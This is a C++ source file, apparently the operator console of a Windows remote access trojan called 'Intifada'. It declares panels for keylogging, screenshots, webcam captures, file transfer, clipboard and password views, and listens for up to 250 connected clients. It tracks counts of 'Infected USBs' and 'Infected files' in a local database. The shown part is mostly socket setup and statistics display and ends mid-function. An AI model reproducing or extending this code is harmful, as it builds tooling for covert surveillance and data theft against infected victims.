//#define ISOLATION_AWARE_ENABLED 1
//#define WIN32_LEAN_AND_MEAN
#define _WIN32_IE 0x0600

#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <commctrl.h>
#include <WindowsX.h>
#include <winuser.h>
#include <richedit.h>
#include <fstream>
#include <iostream>
#include <malloc.h>
#include <olectl.h>
#include <ole2.h>
#include <vfw.h>
#include <objbase.h>
#include<shellapi.h>
#include <gdiplusenums.h>
#include <gdiplus.h>
#include <time.h>
#include <cstdlib>
#include <w32api.h>
#include <Tlhelp32.h>
#include <tchar.h>
#include <psapi.h>
#include <Shlobj.h>




using namespace std;
using namespace Gdiplus;

#include "resource.h"
#include "sqlite3.h"
#include "MyJPEGHandler.h"
//#include "upnpnat.h"
//#include "xmlParser.h"
//#include "SkinWin.h"

/*#pragma comment (lib,"ws2_32.lib")
#pragma comment (lib,"comctl32.lib")
#pragma comment (lib,"ole32.lib")
#pragma comment(lib, "SHLWAPI")*/



#define Alloc(p,t) (t *)malloc((p)*sizeof(t))
#define For(i,n) for ((i)=0;(i)<(n);(i)++)
#define iFor(n) For (i,n)
#define jFor(n) For (j,n)



HINSTANCE GInstance;
HINSTANCE MainInst;
HINSTANCE kInst;
HINSTANCE fInst;
HINSTANCE tInst;
HINSTANCE sInst;
HINSTANCE wInst;
HINSTANCE DLSInst;
HINSTANCE ULSInst;
HINSTANCE rInst;
HINSTANCE AInst;
HINSTANCE BWInst;
HINSTANCE EInst;
HINSTANCE CBInst;

HWND Screen[1024];


HWND hwndMain;
HWND hwndKeylog;
HWND hwndFile;
HWND hwndTask;
HWND hwndScrSht;
HWND hwndwebsht;
HWND hwndabt;
HWND hwndnewfolder;
HWND hwndDLstat;
HWND hwndULstat;
HWND hwndShotstat;
HWND hwndStat;
HWND hwndReg;
HWND hwndWebpage;
HWND hwndpassQ;
HWND hwndHInfo;
HWND hwndPScan;
HWND hwndCBoard;


HWND hList=NULL;
HWND hList2=NULL;
HWND hList3=NULL;
HWND hList4=NULL;
HWND hList5=NULL;
HWND hList6=NULL;
HWND hList7=NULL;
HWND hList8=NULL;
HWND hList9=NULL;
HWND hList10=NULL;
HWND hList11=NULL;
HWND hList12=NULL;
HWND hTree=NULL;
HWND RTree=NULL;
HWND MTabControl=NULL;
HWND hTabControl1=NULL;
HWND hTabControl2=NULL;
HWND hCurrentTab=NULL; // tab dialog handle
HWND STabControl=NULL;
HWND hwndNotify=NULL;


HWND hStatus=NULL;
HWND hStatus2=NULL;
HWND hStatus3=NULL;
HWND hStatus4=NULL;
HWND hStatus5=NULL;
HWND hStatus6=NULL;
HWND hStatus7=NULL;
HWND hStatus8=NULL;
HWND hStatus9=NULL;
HWND hStatus10=NULL;



//HMENU hmenu;
//HMENU hmenuTrackPopup;  // shortcut menu


HIMAGELIST hImageList;
HBITMAP hBitMap;   // bitmap handler
HBITMAP MBitMap;   // bitmap handler
HBITMAP hFBitMap;   // bitmap handler
HBITMAP hTBitMap;   // bitmap handler
TV_INSERTSTRUCT tvinsert; // struct to config the tree control
TV_ITEM tvi; // struct to config the tree control


HTREEITEM Parent;           // Tree item handle
HTREEITEM Before;           // .......
HTREEITEM Root;             // .......
HTREEITEM Selected;
HTREEITEM RTSelected;
HTREEITEM RTParent;




bool flagSelected=false;
void SetSockLog(char *LSocket,char *LAction,char *LPort,char *LTime,int LStat);
void SetSockErrorLog(char *LSocket,char *LAction,char *LPort,char *LTime,int LStat);
void GET_UPLOADFILENAME();
void GetStatsDataBase();
void InitSettings();
DWORD WINAPI ULSTATWindow(LPVOID lpParam);
DWORD WINAPI REFRESH_USERS(LPVOID lParam);
void SetDloadLog(int Dllpic, char* Dllfilename, char* Dllsize, char* Dllusrname, char* Dlldestination, char* Dlltime);
void ShowDloadLog(int Dllpic, char* Dllfilename, char* Dllsize, char* Dllusrname, char* Dlldestination, char* Dlltime);


/////////////////////////
int Count_Connection = -1;
RECT rc;

HICON hIcon;
////////////////////////

LVITEM LvItem;
LVCOLUMN LvCol;
LVITEM LvItem2;
LVCOLUMN LvCol2;
HMENU Fmenu;
char Temp[20];
char FTemp[255]= {0};
char FTemp2[255]= {0};
char RTemp[255]= {0};
int flag;
int iSelect;
int statwidths[] = {160,300,500, -1};
int statwidths2[] = {160, -1};
int statwidths3[] = {160, -1};
int TargetID;
char FinalDir[MAX_PATH];
int SizeGetter;
char MTemp[255]= {0};
char LTaskName[20];
char LUserName[50];
char LStatus[10];
char *Screen_dump;
char *Cam_dump;
int sizecheck = 0;
int filesizecheck = 0;
int DL_filesize = 0;
int cam_filesize = 0;
int scr_filesize = 0;
int log_filesize = 0;
FILE *scrFile;
FILE* LOGFILE;
FILE* DLFile;
FILE* UPLFILE;
FILE *pFile;
char LSSocket[25];
char LSStatus[15];
char LSPort[10];
char LSAction[50];
char DL_Filename[MAX_LEN];
char DLfilename[MAX_PATH];
char NFname[MAX_LEN];
char Copy[MAX_PATH];
char Paste[MAX_PATH];
char CPfilename[MAX_LEN];
char DLTfilename[MAX_LEN];
char UPLfilename[MAX_LEN];
char UPLfilepath[MAX_PATH];
char TfilepathA[MAX_PATH];
BOOL Downloading = FALSE;
int DLLogPic;
int DLLogStat;
char DLLogFilename[MAX_LEN];
char DLLogDestPath[MAX_PATH];
char DLLogFilesize[20];
char DLLogTime[20];
char DLLogUsrname[MAX_LEN];
int SendDataKB = 0;
int RecvDataKB = 0;
BOOL Connected = false;
DWORD thread;
HANDLE FileDloadHandle;
HANDLE FDStaticHandle;
HANDLE FileUloadHandle;
char szIcoFileName[MAX_PATH];
int RSizeKB;
int SSizeKB;
char UPLKB[MAX_LEN];
char DLKB[MAX_LEN];
char TUPLKB[MAX_LEN];
char TDLKB[MAX_LEN];
char INFUSB[20];
char INFEXE[20];
char DLFILE[20];
char DLSIZE[20];
char UPFILE[20];
char UPSIZE[20];
char AcConStat[MAX_LEN];
char AllConStat[MAX_LEN];
int uplkb = 0;
int dlkb = 0;
int Tuplkb = 0;
int Tdlkb = 0;
int infusbs = 0;
int infexes = 0;
int dlfile = 0;
int dlsize = 0;
int upfile = 0;
int upsize = 0;
int AcConNumStat = 0;
int AllConNum=0;
char getsockDBport1[10];
char getsockDBport2[10];
char getsockDBport3[10];
char TreeDir[MAX_PATH];
char TreeRoot[MAX_PATH];
char *SaveLogs;
DWORD LogSize;
HANDLE LogFileHandle;
DWORD numb_bytes;
char DLdir[MAX_PATH];
char ProcessNo[19];
char UploadON[5] = "OFF";
char DownloadON[5] = "OFF";
char CopynPasteON[5] = "OFF";
char ShowDloadWindow[5]="";
char ListenOnStart[5]="";
char KeepDloadLog[5]="";
char RefreshUsers[5]="";
char isListening[5]="NO";
char isDLPathON[5]="";
char isAutoPort[5]="";
char ShowUloadWindow[5]="";
char isOneInstance[5]="";
char NotifyNewUsr[5]="";

char ModuleDirectory[MAX_PATH];

NOTIFYICONDATA NotifyData;

////////////////INTIFADA.DB///////////////////////
char UplRateDB[20], DlRateDB[20], InfPCsDB[20],
InfUSBsDB[20], InfFilesDB[20], DlFilesDB[20],
DlSizeDB[20], UplFilesDB[20], UplSizeDB[20];

//Fmenu = LoadMenu(fInst, MAKEINTRESOURCE(ID_FILE_MENU));
////////////////////////////////////////////////////////////////////////////////
//Keylogger
DWORD dwTextColor = 65280;
DWORD dwTimeColor = 255;
DWORD dwTitleColor = 16777215;
DWORD dwBackColor = 766;
char LogHistory[10000];
//char *LogHistory2;
HANDLE RefHandle;

HBRUSH g_hbrBackground = CreateSolidBrush(RGB(0, 0, 0));

HBITMAP g_hbmScrSht = NULL;
HBITMAP g_hbmAbt = NULL;

//HWND g_hLink;

////socket////
sockaddr sockAddrClient;
sockaddr UsockAddrClient;
sockaddr FsockAddrClient;
char MPort[15]="0";
char UPort[15]="2000";
char FPort[15]="2000";

int UPortHelper = 2000;
int FPortHelper = 2000;

char *Time;
//LoremIpsum lip;
const int nMaxClients=250;
int MClient=0;
int UClient=0;
int FClient=0;
SOCKET Socket[nMaxClients-1];
SOCKET FSocket[nMaxClients-1];
SOCKET USocket[nMaxClients-1];
SOCKET ServerSocket=NULL;
SOCKET UServerSocket=NULL;
SOCKET FServerSocket=NULL;

char ConNum[10];

PACKETHEAD RECV;
DWORD HeadSize1 = sizeof(PACKETHEAD);

EVENTPACKET SEND;
DWORD HeadSize2 = sizeof(EVENTPACKET);

FTRANSFER FSEND;
DWORD FHeadSize = sizeof(FTRANSFER);

FTRANSFER FRECV;
DWORD FRecvSize = sizeof(FTRANSFER);


FILEDOWNLOAD DLRECV;
DWORD DLRecvSize = sizeof(FILEDOWNLOAD);

FILEUPLOAD ULSEND;
DWORD  ULHeadSize= sizeof(FILEUPLOAD);





DWORD exStyles = LVS_EX_FULLROWSELECT| LVS_EX_GRIDLINES;

HIMAGELIST MhImageList;

HIMAGELIST FImageList;
HIMAGELIST TImageList;
HIMAGELIST DLImageList0;
HIMAGELIST DLImageList1;
HIMAGELIST RTImageList;
HIMAGELIST RTLImageList;
HIMAGELIST UTLImageList;
HIMAGELIST SockImageList;
HIMAGELIST SockErrorImageList;

//LPARAM lParam;

//mystruct * MS = (mystruct *)lParam;

//HBITMAP g_hbmBall;// = NULL;
//NOTIFYICONDATA NotifyData;


char ScrRDir[MAX_PATH];
char CamRDir[MAX_PATH];
char DBDir[MAX_PATH];

///////////////////////////////////////////////////////<REAL IMPLEMENTATION>///////////////////////////////////////////////////////////////////////

void MyDir()
{

char test[MAX_PATH];
char show[MAX_PATH];

            ZeroMemory(&test[0],sizeof(test));
            ZeroMemory(&show[0],sizeof(show));
            ZeroMemory(&ScrRDir[0],sizeof(ScrRDir));
            ZeroMemory(&CamRDir [0],sizeof(CamRDir));
            ZeroMemory(&DBDir[0],sizeof(DBDir));


            GetModuleFileName(GetModuleHandle(NULL),test,MAX_PATH);


            int r = 0;

            for(r = strlen(test); r > 0; r--)
            {
                if(test[r]=='\\')
                {

                    //MessageBox(NULL, show, "POS", MB_OK);
                    break;

                }

            }

            for(int i = 0; i<r+1; i++)
            {
                show[i]=test[i];
            }

            strcpy(ModuleDirectory,show);

            strcpy(ScrRDir,ModuleDirectory);
            strcat(ScrRDir,"ScrR.jpg");

            strcpy(CamRDir,ModuleDirectory);
            strcat(CamRDir,"CamR.jpg");

            strcpy(DBDir,ModuleDirectory);
            strcat(DBDir,"Intifada.db");

}




void GetTime()
{
    time_t rawtime;
    struct tm * timeinfo;

    time ( &rawtime );
    timeinfo = localtime ( &rawtime );

    Time = asctime (timeinfo);

}







int Listen(HWND hWnd)
{

    WSADATA WsaDat;
    int nResult=WSAStartup(MAKEWORD(2,2),&WsaDat);
    if(nResult!=0)
    {
        MessageBox(hWnd,
                   "Winsock initialization failed",
                   "Main Socket|Critical Error",
                   MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
       GetTime();
       sprintf(LSSocket, "%s","Main Socket");
       sprintf(LSAction, "%s","Listen");
       sprintf(LSPort, "%s", MPort);

       SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    ServerSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(ServerSocket==INVALID_SOCKET)
    {
        MessageBox(hWnd,
                   "Socket creation failed",
                   "Main Socket | Critical Error",
                   MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
       GetTime();
       sprintf(LSSocket, "%s","Main Socket");
       sprintf(LSAction, "%s","Listen");
       sprintf(LSPort, "%s", MPort);

       SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    SOCKADDR_IN SockAddr;
    SockAddr.sin_port=htons(atoi(MPort));
    SockAddr.sin_family=AF_INET;
    SockAddr.sin_addr.s_addr=htonl(INADDR_ANY);

    if(bind(ServerSocket,(LPSOCKADDR)&SockAddr,sizeof(SockAddr))==SOCKET_ERROR)
    {
        MessageBox(hWnd,"Unable to bind socket. \n Port not available or already in use","Main Socket | Error",MB_OK|MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
       GetTime();
       sprintf(LSSocket, "%s","Main Socket");
       sprintf(LSAction, "%s","Listen");
       sprintf(LSPort, "%s", MPort);

       SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    nResult=WSAAsyncSelect(ServerSocket,
                           hWnd,
                           WM_SOCKET,
                           (FD_CLOSE|FD_ACCEPT|FD_READ));
    if(nResult)
    {
        MessageBox(hWnd,
                   "WSAAsyncSelect failed",
                   "Main Socket | Critical Error",
                   MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
       GetTime();
       sprintf(LSSocket, "%s","Main Socket");
       sprintf(LSAction, "%s","Listen");
       sprintf(LSPort, "%s", MPort);

       SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    if(listen(ServerSocket,SOMAXCONN)==SOCKET_ERROR)
    {
        MessageBox(hWnd,
                   "Unable to listen! \n Max connection reached",
                   "Main Socket | Error",
                   MB_OK | MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
       GetTime();
       sprintf(LSSocket, "%s","Main Socket");
       sprintf(LSAction, "%s","Listen");
       sprintf(LSPort, "%s", MPort);

       SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);

        return 0;


    }
    Sleep(5);
    SetDlgItemText(hWnd, ID_MAIN_STATUS, "Socket:  [Listening]");
    strcpy(isListening,"YES");

    GetTime();
    sprintf(LSSocket, "%s","Main Socket");
    sprintf(LSAction, "%s","Listen");
    sprintf(LSStatus, "%s","Pass");
    sprintf(LSPort, "%s", MPort);

    SetSockLog(LSSocket,LSAction,LSPort,Time,0);

}


int UtilListen(HWND hWnd)
{

RESET:

    InitSettings();

    WSADATA WsaDat;
    int nResult=WSAStartup(MAKEWORD(2,2),&WsaDat);
    if(nResult!=0)
    {
        MessageBox(hWnd,
                   "Winsock initialization failed",
                   "Utility Socket|Critical Error",
                   MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
        GetTime();
        sprintf(LSSocket, "%s","Utility Socket");
        sprintf(LSAction, "%s","Listen");
        sprintf(LSPort, "%s", UPort);

        SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    UServerSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(UServerSocket==INVALID_SOCKET)
    {
        MessageBox(hWnd,
                   "Socket creation failed",
                   "Utility Socket|Critical Error",
                   MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
        GetTime();
        sprintf(LSSocket, "%s","Utility Socket");
        sprintf(LSAction, "%s","Listen");
        sprintf(LSPort, "%s", UPort);

        SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    SOCKADDR_IN SockAddr;
    SockAddr.sin_port=htons(atoi(UPort));
    SockAddr.sin_family=AF_INET;
    SockAddr.sin_addr.s_addr=htonl(INADDR_ANY);

    if(bind(UServerSocket,(LPSOCKADDR)&SockAddr,sizeof(SockAddr))==SOCKET_ERROR)
    {
        if(strstr(isAutoPort,"ON"))
        {
           UPortHelper+=1;
           sprintf(UPort,"%d",UPortHelper);
           goto RESET;
        }

        MessageBox(hWnd,"Unable to bind socket. \n Port not available or already in use","Utility Socket | Error",MB_OK | MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
        GetTime();
        sprintf(LSSocket, "%s","Utility Socket");
        sprintf(LSAction, "%s","Listen");
        sprintf(LSPort, "%s", UPort);

        SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);

        return 0;

    }

    nResult=WSAAsyncSelect(UServerSocket,
                           hWnd,
                           WM_UTILITY_SOCKET,
                           (FD_CLOSE|FD_ACCEPT|FD_READ));
    if(nResult)
    {
        MessageBox(hWnd,
                   "WSAAsyncSelect failed",
                   "Utility Socket | Critical Error",
                   MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
        GetTime();
        sprintf(LSSocket, "%s","Utility Socket");
        sprintf(LSAction, "%s","Listen");
        sprintf(LSPort, "%s", UPort);

        SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    if(listen(UServerSocket,SOMAXCONN)==SOCKET_ERROR)
    {
        MessageBox(hWnd,
                   "Unable to listen! \n Max connection reached",
                   "Utility Socket | Error",
                   MB_OK | MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
        GetTime();
        sprintf(LSSocket, "%s","Utility Socket");
        sprintf(LSAction, "%s","Listen");
        sprintf(LSPort, "%s", UPort);

        SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    GetTime();
    sprintf(LSSocket, "%s","Utility Socket");
    sprintf(LSAction, "%s","Listen");
    sprintf(LSStatus, "%s","Pass");
    sprintf(LSPort, "%s", UPort);

    SetSockLog(LSSocket,LSAction,LSPort,Time,0);


}






int FileListen(HWND hWnd)
{

RESET:

    InitSettings();

    WSADATA WsaDat;
    int nResult=WSAStartup(MAKEWORD(2,2),&WsaDat);
    if(nResult!=0)
    {
        MessageBox(hWnd,
                   "Winsock initialization failed",
                   "File Socket | Critical Error",
                   MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
        GetTime();
        sprintf(LSSocket, "%s","File Socket");
        sprintf(LSAction, "%s","Listen");
        sprintf(LSPort, "%s", FPort);

        SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    FServerSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(FServerSocket==INVALID_SOCKET)
    {
        MessageBox(hWnd,
                   "Socket creation failed",
                   "File Socket | Critical Error",
                   MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
        GetTime();
        sprintf(LSSocket, "%s","File Socket");
        sprintf(LSAction, "%s","Listen");
        sprintf(LSPort, "%s", FPort);

        SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    SOCKADDR_IN SockAddr;
    SockAddr.sin_port=htons(atoi(FPort));
    SockAddr.sin_family=AF_INET;
    SockAddr.sin_addr.s_addr=htonl(INADDR_ANY);

    if(bind(FServerSocket,(LPSOCKADDR)&SockAddr,sizeof(SockAddr))==SOCKET_ERROR)
    {

        if(strstr(isAutoPort,"ON"))
        {
           FPortHelper += 1;
           sprintf(FPort,"%d",FPortHelper);
           goto RESET;
        }

        MessageBox(hWnd,"Unable to bind socket. \n Port not available or already in use","File Socket | Error",MB_OK | MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
        GetTime();
        sprintf(LSSocket, "%s","File Socket");
        sprintf(LSAction, "%s","Listen");
        sprintf(LSPort, "%s", FPort);

        SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);

        return 0;

    }

    nResult=WSAAsyncSelect(FServerSocket,
                           hWnd,
                           WM_FILE_SOCKET,
                           (FD_CLOSE|FD_ACCEPT|FD_READ));
    if(nResult)
    {
        MessageBox(hWnd,
                   "WSAAsyncSelect failed",
                   "File Socket | Critical Error",
                   MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
        GetTime();
        sprintf(LSSocket, "%s","File Socket");
        sprintf(LSAction, "%s","Listen");
        sprintf(LSPort, "%s", FPort);

        SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    if(listen(FServerSocket,SOMAXCONN)==SOCKET_ERROR)
    {
        MessageBox(hWnd,
                   "Unable to listen! \n Max connection reached",
                   "File Socket | Error",
                   MB_OK | MB_ICONERROR);
        //SendMessage(hWnd,WM_DESTROY,NULL,NULL);
        GetTime();
        sprintf(LSSocket, "%s","File Socket");
        sprintf(LSAction, "%s","Listen");
        sprintf(LSPort, "%s", FPort);

        SetSockErrorLog(LSSocket,LSAction,LSPort,Time,1);
        return 0;

    }

    GetTime();
    sprintf(LSSocket, "%s","File Socket");
    sprintf(LSAction, "%s","Listen");
    sprintf(LSStatus, "%s","Pass");
    sprintf(LSPort, "%s", FPort);

    SetSockLog(LSSocket,LSAction,LSPort,Time,0);




}



int CloseConnections()
{


            shutdown(ServerSocket,SD_BOTH);
            closesocket(ServerSocket);
            WSACleanup();

            shutdown(UServerSocket,SD_BOTH);
            closesocket(UServerSocket);
            WSACleanup();

            shutdown(FServerSocket,SD_BOTH);
            closesocket(FServerSocket);
            WSACleanup();


            for(int c=0;c<3;c++)
            {
              WSACleanup();
            }

            Count_Connection = -1;
            MClient=0;

            SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Socket:  [Idle]");
            SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)"Users:  [0]");

            SendMessage(hList,LVM_DELETEALLITEMS,0,0);
            Sleep(5);

            lstrcpy(isListening,"NO");


}



/*int ShufflePort()
{

    srand((unsigned)time(0));
    KEYID = (rand()%100)+1;
    sprintf(UPort, "%d", i);
}*/



// Destroy our windows caption
void DestroyCaption(HWND hwnd)
{
 DWORD dwStyle = GetWindowLong(hwnd, GWL_STYLE);
 dwStyle &= ~(WS_CAPTION/*|WS_SIZEBOX*/);

 SetWindowLong(hwnd, GWL_STYLE, dwStyle);
 InvalidateRect(hwnd, NULL, true);
}



HWND tooltip;
TOOLINFO ti;

DWORD WINAPI CloseBalloonTip(LPVOID lpParam)
{

/*   clock_t endwait;
    endwait = clock() + 5 *CLK_TCK;
    while (clock() < endwait)
    {

    }*/
    Sleep(6000);
    //CloseWindow(tooltip);
    SendMessage(tooltip,TTM_DELTOOL,0,(LPARAM)(LPTOOLINFO)(&ti));

    return 0;


}


int AddBalloonTip(HWND hwnd, char *text, char *title)
{

 //HWND tooltip;
 int ICON_NOTIFY = 1;
 int ICON_WARNING = 2;
 int ICON_ERROR = 3;

 tooltip = CreateWindowEx(0,TOOLTIPS_CLASS,0,WS_POPUP|TTS_NOPREFIX|TTS_BALLOON|TTS_ALWAYSTIP,0,0,0,0,hwnd,NULL,GetModuleHandle(0),0);

RECT rc;
GetClientRect(hwnd,&rc);

//TOOLINFO ti;
ti.cbSize=sizeof(TOOLINFO);
ti.hinst=GetModuleHandle(0);
ti.hwnd=tooltip;
ti.lpszText=text;
ti.rect=rc;
ti.uFlags=TTF_SUBCLASS|TTF_IDISHWND;
ti.uId=(UINT)hwnd;



SendMessage(tooltip,TTM_SETTITLEA,ICON_NOTIFY,(LPARAM)title);
SendMessage(tooltip,TTM_ADDTOOL,0,(LPARAM)(LPTOOLINFO)(&ti));


CreateThread(NULL, 0,CloseBalloonTip,(LPVOID)"", 0, &thread);


return 0;


}






int UpdateStats()
{
        GetStatsDataBase();

        char UplStatLen[MAX_LEN];
        char DlStatLen[MAX_LEN];
        sprintf(UplStatLen,"%d",SendDataKB);
        sprintf(DlStatLen,"%d",RecvDataKB);

        if(strlen(UplStatLen)<7)
        {
        uplkb = SendDataKB/1000;
        sprintf(UPLKB,"%s: %d%s","Upload",uplkb,"kb");
        SetWindowText(GetDlgItem(hwndStat, IDC_UPLKBSTATIC),UPLKB);
        ShowWindow(GetDlgItem(hwndStat, IDC_UPLKBSTATIC),SW_SHOW);
        }


        if(strlen(UplStatLen)>=7)
        {
        uplkb = SendDataKB/1000000;
        sprintf(UPLKB,"%s: %d%s","Upload",uplkb,"mb");
        SetWindowText(GetDlgItem(hwndStat, IDC_UPLKBSTATIC),UPLKB);
        ShowWindow(GetDlgItem(hwndStat, IDC_UPLKBSTATIC),SW_SHOW);
        }


        if(strlen(UplRateDB)<7)
        {
        Tuplkb = atoi(UplRateDB)/1000;
        sprintf(TUPLKB,"%s: %d%s","Total uploads",Tuplkb,"kb");
        SetWindowText(GetDlgItem(hwndStat, IDC_TLUPLKBSTATIC),TUPLKB);
        ShowWindow(GetDlgItem(hwndStat, IDC_TLUPLKBSTATIC),SW_SHOW);
        }

        if(strlen(UplRateDB)>=7)
        {
        Tuplkb = atoi(UplRateDB)/1000000;
        sprintf(TUPLKB,"%s: %d%s","Total uploads",Tuplkb,"mb");
        SetWindowText(GetDlgItem(hwndStat, IDC_TLUPLKBSTATIC),TUPLKB);
        ShowWindow(GetDlgItem(hwndStat, IDC_TLUPLKBSTATIC),SW_SHOW);
        }



        if(strlen(DlStatLen)<7)
        {
        dlkb = RecvDataKB/1000;
        sprintf(DLKB,"%s: %d%s","Download",dlkb,"kb");
        SetWindowText(GetDlgItem(hwndStat, IDC_DLKBSTATIC),DLKB);
        ShowWindow(GetDlgItem(hwndStat, IDC_DLKBSTATIC),SW_SHOW);
        }

        if(strlen(DlStatLen)>=7)
        {
        dlkb = RecvDataKB/1000000;
        sprintf(DLKB,"%s: %d%s","Download",dlkb,"mb");
        SetWindowText(GetDlgItem(hwndStat, IDC_DLKBSTATIC),DLKB);
        ShowWindow(GetDlgItem(hwndStat, IDC_DLKBSTATIC),SW_SHOW);
        }


        if(strlen(DlRateDB)<7)
        {
        Tdlkb = atoi(DlRateDB)/1000;
        sprintf(TDLKB,"%s: %d%s","Total downloads",Tdlkb,"kb");
        SetWindowText(GetDlgItem(hwndStat, IDC_TLDLKBSTATIC),TDLKB);
        ShowWindow(GetDlgItem(hwndStat, IDC_TLDLKBSTATIC),SW_SHOW);
        }

        if(strlen(DlRateDB)>=7)
        {
        Tdlkb = atoi(DlRateDB)/1000000;
        sprintf(TDLKB,"%s: %d%s","Total downloads",Tdlkb,"mb");
        SetWindowText(GetDlgItem(hwndStat, IDC_TLDLKBSTATIC),TDLKB);
        ShowWindow(GetDlgItem(hwndStat, IDC_TLDLKBSTATIC),SW_SHOW);
        }


        sprintf(AcConStat,"%s: %d","Active connections",AcConNumStat);
        sprintf(AllConStat,"%s: %d","All connections",AllConNum);

        SetWindowText(GetDlgItem(hwndStat, IDC_ACCONSTATIC),AcConStat);
        ShowWindow(GetDlgItem(hwndStat, IDC_ACCONSTATIC),SW_SHOW);

        SetWindowText(GetDlgItem(hwndStat, IDC_ALLCONSTATIC),AllConStat);
        ShowWindow(GetDlgItem(hwndStat, IDC_ALLCONSTATIC),SW_SHOW);

        infusbs = atoi(InfUSBsDB);

        sprintf(INFUSB,"%s: %d","Infected USBs",infusbs);
        SetWindowText(GetDlgItem(hwndStat, IDC_INFUSBSTATIC),INFUSB);
        ShowWindow(GetDlgItem(hwndStat, IDC_INFUSBSTATIC),SW_SHOW);

        infexes = atoi(InfFilesDB);

        sprintf(INFEXE,"%s: %d","Infected files",infexes);
        SetWindowText(GetDlgItem(hwndStat, IDC_INFFILESTATIC),INFEXE);
        ShowWindow(GetDlgItem(hwndStat, IDC_INFFILESTATIC),SW_SHOW);

        dlfile = atoi(DlFilesDB);

        sprintf(DLFILE,"%s: %d","Total files downloaded",dlfile);
        SetWindowText(GetDlgItem(hwndStat, IDC_DLFILESTATIC),DLFILE);
        ShowWindow(GetDlgItem(hwndStat, IDC_DLFILESTATIC),SW_SHOW);

        if(strlen(DlSizeDB)<7)
        {
        dlsize = atoi(DlSizeDB)/1000;

        sprintf(DLSIZE,"%s: %d%s","Total size",dlsize,"kb");
        SetWindowText(GetDlgItem(hwndStat, IDC_DLFILESIZESTATIC),DLSIZE);
        ShowWindow(GetDlgItem(hwndStat, IDC_DLFILESIZESTATIC),SW_SHOW);
        }


        if(strlen(DlSizeDB)>=7)
        {
        dlsize = atoi(DlSizeDB)/1000000;

        sprintf(DLSIZE,"%s: %d%s","Total size",dlsize,"mb");
        SetWindowText(GetDlgItem(hwndStat, IDC_DLFILESIZESTATIC),DLSIZE);
        ShowWindow(GetDlgItem(hwndStat, IDC_DLFILESIZESTATIC),SW_SHOW);
        }

        upfile = atoi(UplFilesDB);

        sprintf(UPFILE,"%s: %d","Total files uploaded",upfile);
        SetWindowText(GetDlgItem(hwndStat, IDC_UPLLFILESTATIC),UPFILE);
        ShowWindow(GetDlgItem(hwndStat, IDC_UPLLFILESTATIC),SW_SHOW);


        if(strlen(UplSizeDB)<7)
        {
        upsize = atoi(UplSizeDB)/1000;

        sprintf(UPSIZE,"%s: %d%s","Total size",upsize,"kb");
        SetWindowText(GetDlgItem(hwndStat, IDC_UPLLFILESIZESTATIC),UPSIZE);
        ShowWindow(GetDlgItem(hwndStat, IDC_UPLLFILESIZESTATIC),SW_SHOW);
        }


        if(strlen(UplSizeDB)>=7)
        {
        upsize = atoi(UplSizeDB)/1000000;

        sprintf(UPSIZE,"%s: %d%s","Total size",upsize,"mb");
        SetWindowText(GetDlgItem(hwndStat, IDC_UPLLFILESIZESTATIC),UPSIZE);
        ShowWindow(GetDlgItem(hwndStat, IDC_UPLLFILESIZESTATIC),SW_SHOW);
        }

}






void setlog(char *taskname, char *username,char *log_time, int statusl)
{

    int Itemindex;
    char log_id[10];

    ListView_SetImageList(GetDlgItem(hwndMain, IDC_LIST7),UTLImageList, LVSIL_SMALL);

    Itemindex=SendMessage(hList7,LVM_GETITEMCOUNT,0,0);
    sprintf(log_id,"%d",Itemindex );


    LvItem.iItem=Itemindex;            // item will be put at itemIndex
    LvItem.iSubItem=0;                 // adding item, no need subitems
    LvItem.pszText="";          // set pointer to the item text
    SendMessage(hList7,LVM_INSERTITEM,0,(LPARAM)&LvItem); // put it


    LvItem.pszText=taskname;
    LvItem.iSubItem=1;
    SendMessage(hList7,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems



    LvItem.pszText=username;
    LvItem.iSubItem=2;
    SendMessage(hList7,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems

    LvItem.pszText=log_time;
    LvItem.iSubItem=3;
    SendMessage(hList7,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems


  /*  LvItem.pszText=status;
    LvItem.iSubItem=4;
